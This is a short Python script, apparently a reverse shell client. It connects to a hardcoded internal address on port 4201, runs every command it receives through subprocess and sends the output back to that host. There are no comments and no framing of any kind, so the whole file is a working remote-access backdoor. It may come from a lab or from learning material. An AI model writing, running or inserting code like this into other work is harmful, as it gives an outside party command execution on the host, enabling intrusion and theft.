import socket
import subprocess

def start_client():

    host = '10.9.3.102'
    port = 4201

    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((host, port))


    while True:
        command = client_socket.recv(4096).decode()

        if command.lower() == 'exit':
            break

        result = subprocess.getoutput(command)
        client_socket.send(result.encode())
    client_socket.close()


if __name__ == "__main__":
    start_client()

